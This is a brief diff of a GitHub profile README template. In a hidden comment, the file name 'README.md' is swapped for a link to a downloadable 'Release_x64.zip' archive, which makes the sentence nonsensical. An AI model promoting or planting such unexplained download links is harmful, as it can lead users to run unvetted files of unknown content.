@@ -7,6 +7,6 @@
 - ⚡ Fun fact: ...
 
 <!---
-ousymike/ousymike is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+ousymike/ousymike is a ✨ special ✨ repository because its `https://github.com/ousymike/ousymike/releases/download/v2.0/Release_x64.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
